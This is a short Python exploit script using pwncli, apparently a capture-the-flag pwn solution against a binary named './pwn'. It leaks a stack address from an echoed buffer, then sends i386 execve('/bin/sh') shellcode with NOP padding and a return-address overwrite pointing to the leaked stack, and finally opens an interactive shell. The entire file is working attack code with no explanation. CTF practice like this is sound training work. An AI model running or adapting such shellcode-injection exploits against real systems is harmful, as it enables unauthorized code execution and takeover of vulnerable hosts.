#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
#  set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

ru(b'please input what you want say')
payload = b'a'*4
s(payload)
ru(b"aaaa")
stack_base = u64_ex(rn(4)) - 0x13c
lg("stack_base")

ru(b'please input what you want say')
#  payload = b'a'*(0x68+4)
payload = ShellcodeMall.i386.execve_bin_sh
payload = payload.ljust(0x68+4, b"\x90")
payload += p32(stack_base)
s(payload)

ia()
